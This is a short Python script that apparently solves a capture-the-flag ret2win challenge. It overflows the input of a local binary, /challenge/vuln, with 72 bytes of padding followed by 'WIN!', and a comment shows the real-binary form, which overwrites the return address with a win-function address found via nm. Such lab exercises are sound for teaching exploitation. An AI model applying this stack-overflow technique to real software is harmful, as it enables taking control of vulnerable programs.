#!/usr/bin/python3
import subprocess
# ret2win emulation: 72 pad + WIN!
payload = b"A"*72 + b"WIN!"
p = subprocess.run(["/challenge/vuln"], input=payload, capture_output=True)
print(p.stdout.decode(errors="ignore"))
# Real ELF version: payload = b"A"*72 + p64(win_addr)  # win from `nm vuln | grep win`
